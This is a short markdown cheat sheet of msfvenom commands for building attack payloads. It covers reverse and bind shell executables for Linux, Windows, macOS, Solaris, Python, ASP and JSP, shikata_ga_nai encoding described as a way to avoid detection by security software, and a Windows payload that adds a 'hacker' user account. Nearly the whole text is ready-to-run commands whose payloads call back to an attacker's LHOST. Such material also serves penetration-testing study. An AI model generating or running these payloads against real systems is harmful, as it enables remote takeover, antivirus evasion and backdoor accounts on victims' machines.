### Payload commands
```
# List all payloads
msfvenom -l payloads
msfvenom -l payloads | grep Linux
msfvenom -l payloads | grep Windows

# List payload options
msfvenom -p PAYLOAD --list-options

# Payload Encoding
msfvenom -p PAYLOAD -e ENCODER -f FORMAT -i ENCODE COUNT LHOST=IP

# Choosing platform and the architecture
msfvenom -p PAYLOAD LHOST=<IP> LPORT=<PORT> --platform Linux -a x64 -f elf > shell.elf
```

#### shikata_ga_nai
It is an encoder used to avoid detection by security software. It's a polymorphic XOR additive feedback encoder, which means it changes the signature of the payload every time it's used.
```
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```

#### Linux Payloads
`elf` stands for Executable and Linkable Format, which is typically used to target Linux or Unix-like systems.
```
# Reverse shell (x86 multi stage)
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf

# Bind shell
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf > bind.elf

# SunOS (Solaris)
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```

#### Windows
```
# Meterpreter reverse shell: 
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe

# CMD Single Stage: 
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe

# add user: 
msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe
```

#### Apple
```
# Mac Reverse Shell: 
msfvenom -p osx/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f macho > shell.macho
```

#### Python
```
# Python Shell: 
msfvenom -p cmd/unix/reverse_python LHOST=IP LPORT=PORT -f raw > shell.py
```

#### ASP and JSP
```
# Active Server Pages Meterpreter shell: 
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp > shell.asp

# Java Server Pages Shell: 
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.jsp
```


